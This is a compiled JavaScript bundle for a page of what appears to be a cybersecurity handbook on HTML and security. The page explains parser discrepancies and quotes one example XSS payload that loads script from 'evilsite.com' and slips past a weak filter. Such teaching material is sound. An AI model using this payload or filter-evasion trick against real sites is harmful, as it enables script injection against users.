"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3693],{8937:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var s=n(5893),r=n(1151);const a={},i="HTML",o={id:"networking/specs/html/README",title:"HTML",description:"Hypertext Markup Language is the standard markup language for documents displayed in a web-browser.",source:"@site/docs/networking/specs/html/README.md",sourceDirName:"networking/specs/html",slug:"/networking/specs/html/",permalink:"/cybersecurity-handbook/networking/specs/html/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"DOM - Document Object Model",permalink:"/cybersecurity-handbook/networking/specs/dom/"},next:{title:"HTTP / HTTPS",permalink:"/cybersecurity-handbook/networking/specs/http/"}},c={},l=[{value:"What&#39;s the role of HTML in security?",id:"whats-the-role-of-html-in-security",level:4},{value:"Security",id:"security",level:2},{value:"Parsing",id:"parsing",level:4},{value:"Legacy Parsing",id:"legacy-parsing",level:4}];function d(e){const t={blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",h4:"h4",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"html",children:"HTML"}),"\n",(0,s.jsxs)(t.p,{children:[(0,s.jsx)(t.em,{children:"Hypertext Markup Language"})," is the standard markup language for documents displayed in a web-browser."]}),"\n",(0,s.jsx)(t.p,{children:"Web browsers receive HTML documents rom a web server or from local storage, and render the documents into multimedia web pages."}),"\n",(0,s.jsx)(t.h4,{id:"whats-the-role-of-html-in-security",children:"What's the role of HTML in security?"}),"\n",(0,s.jsxs)(t.p,{children:["HTML can ",(0,s.jsx)(t.strong,{children:"embed programs"})," written in a scriptining language such as JavaScript, which affects the behavior and content of web pages."]}),"\n",(0,s.jsx)(t.h2,{id:"security",children:"Security"}),"\n",(0,s.jsx)(t.h4,{id:"parsing",children:"Parsing"}),"\n",(0,s.jsx)(t.p,{children:"HTML should be parsed according to the relevant spec, generally HTML5 now. It's often not just parsed by your browser but also Web-Application Firewalls and other filters."}),"\n",(0,s.jsxs)(t.blockquote,{children:["\n",(0,s.jsx)(t.p,{children:"Wherever there's a discrepancy in how two items parse things, there's probably a vulnerability."}),"\n"]}),"\n",(0,s.jsx)(t.p,{children:"Let's see a canonical example."}),"\n",(0,s.jsxs)(t.p,{children:["You go to ",(0,s.jsx)(t.code,{children:"http://example.com/vulnerable?name=<script/xss%20src=http://evilsite.com/my.js>"})," and it generates:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-html",children:"<!DOCTYPE html>\n<html>\n    <head>\n        <title>Vulnerable page named <script/xss src=...></title>\n    </head>\n</html>\n"})}),"\n",(0,s.jsxs)(t.p,{children:["A bad XSS filter on the web application may not see hat as a script tag due to it being a ",(0,s.jsx)(t.code,{children:"script/xss"})," tag. Firefox's HTML parser, for example, treats the slash as a whitespace, enabling the attack!"]}),"\n",(0,s.jsx)(t.h4,{id:"legacy-parsing",children:"Legacy Parsing"}),"\n",(0,s.jsx)(t.p,{children:"Due to decades of bad HTML, browsers are quite excellent at cleaning up after authors, and these conditions are often exploitable:"}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsxs)(t.li,{children:[(0,s.jsx)(t.code,{children:"<script>"})," tag on its own wil automatically be closed at the ond of the page."]}),"\n",(0,s.jsx)(t.li,{children:"A tag missing is closing angle bracket wil automatically by closed by the angle bracket of the next tag on the page."}),"\n"]})]})}function h(e={}){const{wrapper:t}={...(0,r.a)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},1151:(e,t,n)=>{n.d(t,{Z:()=>o,a:()=>i});var s=n(7294);const r={},a=s.createContext(r);function i(e){const t=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(a.Provider,{value:t},e.children)}}}]);